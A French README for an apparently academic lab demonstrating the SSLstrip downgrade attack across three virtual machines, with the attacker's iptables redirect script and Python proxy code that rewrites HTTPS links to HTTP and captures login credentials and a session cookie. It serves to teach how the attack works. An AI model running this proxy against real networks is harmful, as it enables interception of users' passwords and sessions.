# Attaque SSLstrip

L'attaque SSLstrip a été présentée pour la première fois par Moxie à la Blackhat de 2009.

Cette attaque consiste à remplacer dans les requêtes HTTP, toutes les références à des URL pointant vers des liens HTTPS par leurs version HTTP. Cette attaque était efficace notamment lorsque seule la page de login était sécurisée en HTTPS mais que le reste du site utilisait le protocole HTTP.

----------------------------------------------

# Configuration de l'environnement de test

L'environnement de test consiste en trois machines virtuelles :

- grave, la machine cliente et victime.

- opeth, la machine serveur.

- immortal, la machine attaquante, positionnée en homme du milieu.

Voici la [topologie](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip/topology) des machines mise en place :

```
### twolans
#
#  opeth - [s1] - immortal - [s2] - grave
#

# switches

SWITCH s1
SWITCH s2
HOST alpinex   grave    s2
HOST debian10  immortal s1 s2
HOST debian10  opeth    s1
```

Cette topologie n'est pas forcément réaliste car rare sont les cas où l'attaquant est dans le réseau du client attaqué.

Toutes les configurations initiales des machines se trouvent dans le fichier __"start.sh"__ de chaque dossier correspondant aux machines.

## Machine "grave" (147.210.13.2)

Cette machine utilise l'environnement graphique de la distribution Linux Alpine. Le navigateur firefox est utilisé pour la démonstration.

Au lancement de la machine, il faut l'autorité de certification dans firefox. Se reporter au fichier [start.sh](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip/grave/start.sh)

## Machine "opeth" (www.opeth.local)

Cette machine héberge un serveur HTTP(s) Nginx sur le port 80 et 443. Le certificat utilisé pour les connexions HTTPS a été généré avec les scripts [create-ca.sh](https://github.com/t00sh/mastercsi-ter/tree/master/CA/create-ca.sh) et [new-cert.sh](https://github.com/t00sh/mastercsi-ter/tree/master/CA/new-cert.sh) de la façon suivante :

```
$ cd CA
$ ./create-ca.sh
$ ./new-cert.sh
```

Le serveur héberge deux pages :

  - une page [index.php](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip/opeth/www/index.php) que l'on accéde en HTTP et présentant un formulaire de login.

  - une page [secure.php](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip/opeth/www/secure.php) que l'on accéde en HTTPS depuis la page index.php.

## Machine "immortal" (147.210.12.2 - 147.210.13.1)

C'est sur cette machine que se trouve le PoC de l'attaque, dans le fichier [/mnt/host/attack.sh](https://github.com/t00sh/mastercsi-ter/tree/master-b64c24f/sslstrip/immortal/attack.sh).

Cette VM est configurée pour forwarder les paquets entre opeth et grave.


------------------------------------------------------

# Démo

Pour lancer l'environnement de test, il faut lancer la commande suivante (on aura récupéré au préalable le dépôt qemunet) :

```
$ ./qemunet/qemunet.sh -x -S sslstrip
```

À partir de là, les trois machines sont lancées.

## Étape 1 : avant l'attaque

Lorsque l'attaque n'est pas encore lancée, nous pouvons voir sur la machine grave, que tout se passe normalement et que la requête POST passe bien en HTTPS (immortal est donc incapable de voir les identifiants envoyés) :

![screen1](../medias/sslstrip/screen1.png?raw=true)

L'encadré rouge montre bien que le POST est effectué en HTTPS, sur la page secure.php.

![screen2](../medias/sslstrip/screen2.png?raw=true)

Nous arrivons alors sur la page secure.php, en HTTPS : la machine immortal n'a pas pût voir nos échanges sur cette page sécurisée.

![screen3](../medias/sslstrip/screen3.png?raw=true)

## Etape 2 : lancement de l'attaque

Comme expliqué précédement, pour lancer l'attaque, il faut exécuter le fichier __[/mnt/host/attack.sh](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip/immortal/attack.sh)__ depuis immortal. Voici son contenu :

```
PROXY_PORT=4242

iptables -t nat -F
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $PROXY_PORT

/mnt/host/sslstrip.py $PROXY_PORT
```

La règle iptables permet de rediriger les flux TCP à destination du port 80 (HTTP) vers le port d'écoute du proxy qui est chargé d'analyser et traiter les requêtes.

![screen4](../medias/sslstrip/screen4.png?raw=true)

### Explication du code du proxy

Le code du proxy est dans le fichier [sslstrip.py](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip/immortal/sslstrip.py).

#### Réception des requêtes

Lors de la réception de requêtes, il s'agit de savoir si l'on doit :

- fermer la connexion (le client ou le serveur a fermé sa socket)
- établir une connexion https, dans le cas où le client demande la page [secure.php](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip/opeth/www/secure.php)
- établir une connexion http, dans le cas où le client demande la page d'accueil [index.php](https://github.com/t00sh/mastercsi-ter/blob/master/sslstrip/opeth/www/index.php)

Voici la fonction implémentant la reception d'une requête HTTP :

```python
def __recv(self, csock):
        fw_sock = self.__csockets[csock]
        data = csock.recv(BUFFER_SIZE)
        if len(data) == 0:
            self.__close_conn(csock)
            self.__close_conn(fw_sock)
        else:
            print(data)

            if fw_sock is None:
                m = re.search(b'(GET|POST) (\S+) HTTP/\d.\d', data)
                if m is not None and m.group(2) in HTTPS_URL:
                    self.__new_https_conn(csock)
                else:
                    self.__new_http_conn(csock)
                fw_sock = self.__csockets[csock]
            data = self.__replace_https_to_http(data)
            data = self.__replace_content_length(data)
            fw_sock.send(data)

```

A la fin, on transforme tous les liens __https__ trouvé en __http__ et on recalcule la taille de la requête (entête Content-Length).

#### Transformation des liens

La transformation se fait à l'aide d'une expression régulière qui remplace __https://__ par __http://__ dans les données HTTP.

```python
def __replace_https_to_http(self, data):
        return re.sub(b'https://', b'http://', data)
```

#### Recalcule de l'entête Content-Length

Il faut ensuite recalculer l'entête Content-Length, en se basant sur le début des données HTTP situées après la séquence "\r\n\r\n" :

```python
def __replace_content_length(self, data):
    try:
        idx = data.index(b"\r\n\r\n")
        length = len(data) - idx - 4
        return re.sub(b'Content-Length: (\d+)',
                      b'Content-Length: %d' % length, data, 1)
    except:
        return data
```

## Etape 3 : pendant l'attaque

Lorsque l'attaque est lancée, on peut voir que tous les liens https:// sont remplacés par http://.

La machine immortal est donc capable d'intercepter les échanges réalisés sur la page secure.php. Ici on voit dans l'encadré rouge, que le lien https:// a bien été remplacé par un lien non sécurisé http:// :

![screen5](../medias/sslstrip/screen5.png?raw=true)

Nous constatons que nous arrivons sur la page secure.php en HTTP : notre navigation n'est pas sécurisée !

![screen6](../medias/sslstrip/screen6.png?raw=true)

La machine immortal a été capable de capturer non seulement les identifiants du formulaire, mais également le cookie de session :

![screen7](../medias/sslstrip/screen7.png?raw=true)
